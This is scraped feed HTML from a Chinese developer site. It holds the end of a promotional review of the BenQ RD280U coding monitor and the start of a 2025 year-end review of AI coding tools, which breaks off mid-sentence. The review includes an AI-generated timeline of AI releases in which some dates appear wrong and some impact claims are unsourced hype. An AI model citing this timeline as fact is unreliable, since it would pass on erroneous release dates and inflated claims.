<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8582785ee8aa48a4908a23f0feccefb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=0mi1QR6%2Fc5tLdQLkCOYDfkTEo9w%3D" alt="详细配置.jpg" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-4">深夜：<code>MoonHalo</code> 与猫头鹰模式，解决亮暗反差</h3>
<p>深夜写代码，是很多程序员的常态。真正让眼睛难受的，往往不是屏幕本身亮，而是屏幕亮度和环境黑暗之间的反差太大。盯着一块发光的矩形久了，眼压和干涩感很容易上来。</p>
<p><strong>1. <code>MoonHalo</code> 智慧光环：</strong> 这真的不是电竞 <code>RGB</code>。它更像是一个智能背景灯，通过照亮屏幕后方的墙面，形成一层均匀的补光。它消除了屏幕与黑暗背景之间的锐利边界。当你视线从 <code>IDE</code> 移向桌面喝口水，再移回屏幕时，瞳孔不需要剧烈缩张，这种舒适感是实打实的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73c86b1fbc11414d81a1a3964cb86330~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=baAAgTll4ElTbDiCoVWAPibNxgk%3D" alt="20250225002749404.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32bc20b643584873bc4b06f05cc06b3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=09nweyZCAchpP83FhqS7deBdckk%3D" alt="背光" loading="lazy"/></p>
<p><strong>2. 猫头鹰模式（夜间保护）：</strong> 普通显示器调低亮度后会出现色彩断层、对比度塌陷。而猫头鹰模式能在亮度压得很低的情况下，依然保证代码的清晰度。对于深夜党来说，这种暗但不糊的状态，才是真正有用的护眼，而不是一个概念。</p>
<hr/>
<h3 data-id="heading-5">多设备与自动化：让工具去适应人的逻辑</h3>
<p>程序员还有一类很容易被忽略的消耗：在设备和任务之间不断切换带来的注意力断点。</p>
<p><strong>1. 链路效率的提升：</strong></p>
<ul>
<li><strong><code>90W Type-C</code> 一线直连：</strong> 视频信号和供电一根线搞定，<code>MacBook</code> 用户再也不需要拖着个笨重的电源适配器。</li>
<li><strong><code>KVM</code> 功能：</strong> 这对于要同时操作 <code>Linux</code> 工作站和 <code>Mac</code> 笔记本的开发来说是刚需。一套键鼠切两台设备，少一次拔插、少一次找输入源，思路就少断一次。</li>
</ul>
<p><strong>2. <code>Display Pilot 2</code> 与 <code>Flow</code> 功能：</strong> 这套软件更像是给显示器加了个自动化脚本。你可以设定：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be55b27d66714cf9a76f9f4f527ed4dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=TAxTJfesQGaiJhbJBf5qboFnpC4%3D" alt="软件界面" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80521ab14f374b1eb0e1751de7fc5d22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=OvB26MMtrtllMibz7PMdrGVd9UU%3D" alt="Flow.jpg" loading="lazy"/></p>
<ul>
<li>早上 9 点：自动开启编程模式。</li>
<li>晚上 8 点：自动点亮 <code>MoonHalo</code>，开启猫头鹰模式。</li>
<li>甚至可以关联应用：打开 <code>VS Code</code> 自动切模式，打开 <code>Chrome</code> 自动调色彩。 这种让工具自动适应人，而不是人去手动调工具的逻辑，本身就很符合程序员的思维习惯。</li>
</ul>
<hr/>
<h3 data-id="heading-6">总结：它不是堆参数，而是在减少损耗</h3>
<p>体验 <code>RD280U</code> 两周后，我最直观的感受是：它并不是靠堆砌那些溢出的硬件参数（比如 <code>240Hz</code> 高刷）制造升级感，而是在处理程序员每天都会遇到的那些真实损耗。</p>
<p><strong>为什么这笔投资值？</strong></p>
<ul>
<li><strong>减少了物理损耗：</strong> <code>3:2</code> 屏比多出来的纵向空间。</li>
<li><strong>减少了生理损耗：</strong> 抗反射、<code>MoonHalo</code> 和专业的编程色彩模式。</li>
<li><strong>减少了时间损耗：</strong> <code>Type-C</code>、<code>KVM</code> 和自动化的 <code>Flow</code> 模式。</li>
</ul>
<p>这些单点看起来可能不是什么惊天动地的技术革新，但当你把它们叠加到每天 10 小时、一年 2000+ 小时的使用时长里，你会发现它的回报是非常稳定的。</p>
<p>有人在京东评论区写过一句话，我深以为然：「这台显示器的价格可能只是半个月的公积金，但它能陪你度过未来几年的每一个加班夜晚。」</p>
<p><strong>赋能开发者，共赢未来。</strong> 对于我们这种靠视线和逻辑吃饭的人来说，显示器不只是一个配件，它更像是我们身体感官的延伸。如果你已经明显感到眼睛在被过度的眩光和反光消耗，那么像 <code>RD280U</code> 这样真正围绕开发者场景设计的产品，确实值得你为自己的职业寿命做一次长远投资。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 年终技术复盘：从传统编程到 Vibe Coding 的工作流跃迁]]></title>    <link>https://juejin.cn/post/7592119218029166626</link>    <guid>https://juejin.cn/post/7592119218029166626</guid>    <pubDate>2026-01-06T09:53:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592119218029166626" data-draft-id="7591942733366280226" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 年终技术复盘：从传统编程到 Vibe Coding 的工作流跃迁"/> <meta itemprop="keywords" content="前端,人工智能,程序员"/> <meta itemprop="datePublished" content="2026-01-06T09:53:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一点一木"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986187486"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 年终技术复盘：从传统编程到 Vibe Coding 的工作流跃迁
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986187486/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一点一木
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:53:20.000Z" title="Tue Jan 06 2026 09:53:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2da23224e41e44ffa04e310c4a562c39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=kCgtFpS%2FegIzrrshzpIdfEIvTiI%3D" alt="cover" loading="lazy"/></p>
<p>这一年，我从加班修 <code>bug</code> 到凌晨的牛马，变成了用自然语言<code>vibe</code>出项目的 <code>AI</code> 协作者。变化之大，超乎想象。</p>
<p>看到掘金上大家纷纷写 2025 年终总结，有生活感悟、有职业成长、有各种奇妙经历，我也忍不住动笔了。作为一个在掘金混了几年的 <code>AI</code> 领域博主，这一年的变化对我来说太大了——以前加班修 <code>bug</code> 到凌晨是常态，现在大部分编码工作都交给 <code>AI</code> 了。每次有新 <code>AI</code> 工具或模型火起来，我都会用 <code>Trae</code> 或 <code>Cursor</code> 开一个新项目，去验证它的潜力和边界。</p>
<p>所以我准备写两篇总结，<strong>第一篇（就是这篇）专注技术</strong>：完整回顾 2025 年 <code>AI</code> 大事记，总结我目前的主力技术栈，并展望 2026 年及未来的趋势。第二篇会更私人化，聊聊生活和成长。</p>
<p>有趣的是，这篇文章的核心时间线表格，我也是用 <code>AI</code>（<code>Trae</code> + <code>DeepSeek</code>）生成的，还顺手做了一个互动网站：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftraetjyyjrlg.vercel.app%2F%3Freferrer%3Dgrok.com" target="_blank" title="https://traetjyyjrlg.vercel.app/?referrer=grok.com" ref="nofollow noopener noreferrer">traetjyyjrlg.vercel.app/</a>（响应式设计，手机也友好）。<strong>这本身就是 2025 年 <code>Vibe Coding</code> 的最佳注脚——从想法到上线，只用了一个小时。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e1cd3d905924962b085ca73a40f3c37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=l6U7b%2FBozxwQsATPU%2B5Zz4IJ73U%3D" alt="2025AI01" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b69cc5ff858410fb286546ede2603e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=O2YFzADmbfqU%2F8tEN6c9cwpZKXs%3D" alt="2025AI02" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bce473104a8443aaa29aaefae4a76351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=C4qZSOIcjq5NinUnej0yaBJ1BN0%3D" alt="2025AI03" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-0">2025 年 <code>AI</code> 技术总览：从炒作到实用落地的转折年</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e48a1e02050448395df6337d471a1f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=d7UmXg92uCjMNVYPbFpwAASnjq4%3D" alt="1rVhMGWHqNYBZGIsuuX89" loading="lazy"/></p>
<p>2025 年是 <code>AI</code> 真正从概念炒作转向实用代理和编程革命的一年。主要趋势有四个：</p>
<ul>
<li><strong><code>Agentic AI</code> 爆发</strong>：<code>AI</code> 从聊天助手变成能自主执行复杂任务的数字员工。</li>
<li><strong><code>Vibe Coding</code> 流行</strong>：编程范式革命，用自然语言描述意图，<code>AI</code> 负责实现。</li>
<li><strong>开源追赶闭源</strong>：<code>DeepSeek</code>、<code>Llama</code> 等开源模型性能逼近甚至局部超越 <code>GPT/Claude</code>，成本大幅下降。</li>
<li><strong>多模态/推理能力提升</strong>：视频、图像、长上下文、动态思考成为标配。</li>
</ul>
<p>根据多个权威来源整理，以下是按月的主要产品和技术时间线（重点模型、工具、事件）。</p>
<hr/>
<h3 data-id="heading-1">2025 年 <code>AI</code> 主要产品和技术发布时间线</h3>





































































































































































































<table><thead><tr><th>月份</th><th>日期</th><th>核心事件 / 产品发布</th><th>行业影响与 <code>Vibe</code> 点（技术深度解析）</th></tr></thead><tbody><tr><td><strong>1月</strong></td><td>1月20日</td><td><strong><code>DeepSeek-R1</code></strong> 正式开源</td><td><strong>推理民主化</strong>：推理模型成本骤降，算力焦虑首次得到结构性缓解。</td></tr><tr><td/><td>1月22日</td><td><strong><code>OpenAI Operator</code></strong> (预览版)</td><td><strong>动作代理</strong>：<code>AI</code> 开始接管计算机 <code>UI</code> 操作，从对话转向执行。</td></tr><tr><td/><td>1月25日</td><td><strong><code>OpenAI o3-mini</code></strong> 发布</td><td><strong>极速推理</strong>：将高阶推理能力引入轻量模型，<code>API</code> 响应进入毫秒时代。</td></tr><tr><td><strong>2月</strong></td><td>2月6日</td><td><strong><code>Vibe Coding</code></strong> 概念提出</td><td><strong>编程范式革命</strong>：<code>Andrej Karpathy</code> 确立了“意图大于语法”的新共识。</td></tr><tr><td/><td>2月24日</td><td><strong><code>Claude 3.7 Sonnet</code></strong> 发布</td><td><strong>开发者首选</strong>：凭借极强的逻辑严密性，成为 2025 上半年口碑最强的编码模型。</td></tr><tr><td/><td>2月中旬</td><td><strong><code>GPT-4.5</code></strong> 突然发布</td><td><strong>可靠性飞跃</strong>：大幅降低模型幻觉，复杂逻辑链的断裂率下降 60%。</td></tr><tr><td><strong>3月</strong></td><td>3月6日</td><td><strong><code>Manus AI</code></strong> 正式推出</td><td><strong>自主代理标杆</strong>：首个能独立完成多步、跨应用复杂任务的中国智能体。</td></tr><tr><td/><td>3月17日</td><td><strong><code>NVIDIA GTC 2025</code></strong></td><td><strong>算力基座</strong>：<code>Blackwell Ultra</code> 芯片发布，为万亿参数模型提供硬件支撑。</td></tr><tr><td/><td>3月下旬</td><td><strong><code>Gemini 2.5 Pro</code></strong> 最终版</td><td><strong>长文本之王</strong>：<code>1M</code> 上下文稳定商用，支持分析一整个微服务架构库。</td></tr><tr><td><strong>4月</strong></td><td>4月15日</td><td><strong><code>Meta Llama 4</code></strong> 系列预览</td><td><strong>开源脊梁</strong>：开源 <code>MoE</code> 架构首次在多个基准测试中追平闭源旗舰。</td></tr><tr><td/><td>4月28日</td><td><strong><code>GPT-4.1</code></strong> 家族更新</td><td><strong>生产力稳态</strong>：重点解决环境鲁棒性，<code>API</code> 稳定性与成本效益显著提升。</td></tr><tr><td/><td>4月29日</td><td><strong><code>Docker MCP</code></strong> 工具市场开启</td><td><strong>插件标准化</strong>：打破代理调用工具的壁垒，<code>Agent</code> 进入即插即用时代。</td></tr><tr><td><strong>5月</strong></td><td>5月14日</td><td><strong><code>Google I/O 2025</code></strong></td><td><strong>多模态原生</strong>：发布 <code>Veo 3</code> 和 <code>Imagen 4</code>，视频/图像生成与推理深度融合。</td></tr><tr><td/><td>5月20日</td><td><strong><code>Claude 4 Opus</code></strong> 抢跑发布</td><td><strong>逻辑重构</strong>：在复杂软件工程评测中达成神级评分，确立首席编程 <code>AI</code> 地位。</td></tr><tr><td/><td>5月28日</td><td><strong><code>DeepSeek-R1-0528</code></strong> 更新</td><td><strong>中国速度</strong>：国产模型在代码生成基准上持续领跑，蒸馏版横扫端侧市场。</td></tr><tr><td><strong>6月</strong></td><td>6月上旬</td><td><strong><code>Apple Intelligence</code></strong> 集成</td><td><strong>端侧 <code>AI</code> 爆发</strong>：<code>AI</code> 代理正式进入数十亿用户的移动操作系统底层。</td></tr><tr><td/><td>6月15日</td><td><strong><code>Trae</code></strong> <code>SOLO</code> 模式发布</td><td><strong>国产 <code>IDE</code> 之光</strong>：字节跳动推出具备极强自主能力的 <code>AI</code> 编程模式。</td></tr><tr><td><strong>7月</strong></td><td>7月10日</td><td><strong><code>ChatGPT Agent</code></strong> 嵌入</td><td><strong>代理平民化</strong>：用户无需编程即可在 <code>Web</code> 端构建垂直领域的编码代理。</td></tr><tr><td/><td>7月30日</td><td><strong><code>xAI Grok 4</code></strong> 发布</td><td><strong>硬核推理</strong>：推理能力登上新高度，上下文窗口扩展至 <code>2M</code> 超长规模。</td></tr><tr><td><strong>8月</strong></td><td>8月7日</td><td><strong><code>OpenAI GPT-5</code></strong> 正式发布</td><td><strong>年度高光</strong>：引入动态思考，极大提升了复杂 <code>Agent</code> 任务的成功率。</td></tr><tr><td/><td>8月5日</td><td><strong><code>GPT-OSS</code></strong> (开源权重)发布</td><td><strong>行业地震</strong>：<code>OpenAI</code> 罕见的开源举动，标志着闭源巨头防线的全面调整。</td></tr><tr><td><strong>9月</strong></td><td>9月15日</td><td><strong><code>OpenAI Sora 2</code></strong> 公测</td><td><strong>视频革命</strong>：实现物理规律的一致性，长视频生成进入工业可用阶段。</td></tr><tr><td/><td>9月29日</td><td><strong><code>DeepSeek-V3.2</code></strong> 发布</td><td><strong>效能巅峰</strong>：提出 <code>DSA</code> 机制，长上下文推理成本再次实现断崖式下跌。</td></tr><tr><td><strong>10月</strong></td><td>10月6日</td><td><strong><code>OpenAI DevDay</code></strong> / <strong><code>Codex</code></strong></td><td><strong>工具链闭环</strong>：<code>Codex</code> 正式版与 <code>AgentKit</code> 发布，支持 <code>MCP</code> 协议的原生应用。</td></tr><tr><td/><td>10月21日</td><td><strong><code>ChatGPT Atlas</code></strong> 浏览器</td><td><strong>形态剧变</strong>：推出首款 <code>AI</code> 原生浏览器，支持在网页内直接执行代理任务。</td></tr><tr><td/><td>10月28日</td><td><strong><code>Adobe MAX</code></strong> / <strong><code>Firefly 5</code></strong></td><td><strong>创意工程化</strong>：引入分层提示词编辑，实现设计流的文本级精确控制。</td></tr><tr><td><strong>11月</strong></td><td>11月18日</td><td><strong><code>Google Gemini 3</code></strong> 旗舰版</td><td><strong>元认知开启</strong>：模型具备自我审查与反思能力，逻辑推导接近人类水平。</td></tr><tr><td/><td>11月24日</td><td><strong><code>Claude Opus 4.5</code></strong> 发布</td><td><strong>逻辑巅峰</strong>：在极度复杂的工程重构任务中展现出统治级实力。</td></tr><tr><td><strong>12月</strong></td><td>12月10日</td><td><strong><code>GPT-5.2</code></strong> &amp; <strong><code>Codex</code> 代理</strong></td><td><strong>全自动工程</strong>：<code>AI</code> 代理自主管理从需求到 <code>CI/CD</code> 部署的全生命周期。</td></tr><tr><td/><td>12月17日</td><td><strong><code>Gemini 3 Flash</code></strong> 极速版</td><td><strong>实时交互</strong>：极低延迟响应，实时视觉翻译与增强现实 <code>(AR)</code> 应用爆发。</td></tr><tr><td/><td>12月29日</td><td><strong><code>Meta</code> 收购 <code>Manus</code></strong></td><td><strong>尘埃落定</strong>：全球社交巨头押注 <code>Agentic AI</code> 商业化，标志着 2025 完美收官。</td></tr></tbody></table>
<blockquote>
<p><strong>想互动查看时间线？</strong> 点这里：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftraetjyyjrlg.vercel.app%2F" target="_blank" title="https://traetjyyjrlg.vercel.app/" ref="nofollow noopener noreferrer">traetjyyjrlg.vercel.app/</a>，我用 <code>Trae</code> + <code>Vercel</code> 一键部署的。</p>
</blockquote>
<p>这些宏大事件并非遥不可及，它们直接影响了我的日常开发。接下来，我分享如何将这些技术落地到个人技术栈和工作流中。</p>
<hr/>
<h3 data-id="heading-2">我的 2025 技术栈总结：从工具到工作流</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac33e11642874336a72f45af110290b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=WC%2Fyi06f8f4G2owRpaeTqKGcNyc%3D" alt="NeP5ImnyCNWE0X-pTwMWD" loading="lazy"/></p>
<p>时间线很宏大，但对我来说，最重要的是这些技术如何落地到日常开发中。这一年，我的主力工具和流程基本定型：</p>
<h4 data-id="heading-3">核心编辑器/<code>IDE</code></h4>
<ul>
<li>
<p><strong><code>Trae</code>（字节跳动）</strong> ：我的主力工具之一，尤其是 6 月 <code>SOLO</code> 模式发布后，常作为默认 <code>IDE</code> 使用。免费、稳定、支持 <code>DeepSeek</code> 满血版，<code>Builder</code> 模式完美支持 <code>Vibe Coding</code>。我用它做了10+ 个项目，从简单的一句话项目到复杂的包括前后端的完整项目。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6674292f02f945dab2d778945903360c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=FY0ea95gmD6urTH2Wc0aRVoglUA%3D" alt="TraeSOLO" loading="lazy"/></p>
</li>
<li>
<p><strong><code>Cursor</code></strong>：另一主力工具，<code>Composer</code> 模式处理大型代码库时更强，常和 <code>Trae</code> 混用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce8763b63b3d4771befcc53c9540339b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=bxs6jmIb7qqsfGJvMfz3n61ejmw%3D" alt="Cursor" loading="lazy"/></p>
</li>
</ul>
<h4 data-id="heading-4">主力模型</h4>
<ul>
<li><strong><code>Claude Opus 4.5 / Sonnet</code>系列</strong>：逻辑最强，代码审查和复杂任务首选。</li>
<li><strong><code>DeepSeek</code> 系列</strong>：开源免费，数学/代码生成 <code>SOTA</code>，<code>Trae</code> 集成后原型速度翻倍。</li>
<li><strong><code>GPT-5 / Gemini 3</code></strong>：多模态任务（如图像+代码）时用，<code>Atlas</code> 浏览器里直接 <code>vibe</code> 超方便。</li>
</ul>
<h4 data-id="heading-5">工作流变化</h4>
<ul>
<li><strong>原型阶段</strong>：纯 <code>Vibe Coding</code> ——自然语言描述需求，<code>Trae/Codex</code> 生成 80% 代码，我只审改。</li>
<li><strong>迭代阶段</strong>：用 <code>AgentKit</code> 多代理协作，一个代理写代码，一个审查，一个测试。</li>
<li><strong>部署阶段</strong>：<code>Vercel</code> + <code>Trae</code> 一键部署，<code>Atlas</code> 浏览器直接预览。</li>
<li><strong>踩坑反思</strong>：早期纯 <code>Vibe</code> 大项目容易维护难，后来学会混合模式——关键架构我手动把控。</li>
</ul>
<p>效率提升至少 3 倍，编程从苦活变成创意游戏。这些变化得益于我对 <code>Trae</code> 的深度使用，下面分享一些实战技巧，帮助你更好地利用它。</p>
<hr/>
<h3 data-id="heading-6"><code>Trae</code> 使用实用技巧分享：个人规则 + 项目规则</h3>
<p>作为 <code>Trae</code> 的重度用户（2025 年几乎大部分项目都靠它 <code>vibe</code> 出来），我超级乐意分享一些实战技巧！<code>Trae</code> 的魅力在于其免费版就已足够强大（每月提供 10 次 <code>Premium</code> 模型快速请求、50 次慢速请求，以及 1000 次 <code>Advanced</code> 模型请求），但我个人用的是 <code>Pro</code> 付费版（首月 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mtext>，之后</mtext></mrow><annotation encoding="application/x-tex">3，之后 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">3</span><span class="mord cjk_fallback">，之后</span></span></span></span></span>10/月），它解锁了无限请求、更快的响应速度、无限模型切换，以及优先访问最新功能（如增强的上下文管理和高级调试工具）。这让我在处理复杂项目时避免了限额中断，效率更高，尤其是 <code>Gemini-3-Pro-Preview</code> 模型超香。付费版相比免费版的最大好处是稳定性——没有请求配额的焦虑，能全天候高强度使用；同时，<code>Pro</code> 用户还能享受专属支持和早期 <code>Beta</code> 功能测试。总之，免费版适合入门和轻度使用，而 <code>Pro</code> 版是重度用户的必备，性价比极高。尤其是 <code>Builder</code> 和 <code>SOLO</code> 模式，让 <code>Vibe Coding</code> 真正落地。下面我分个人规则（主要是 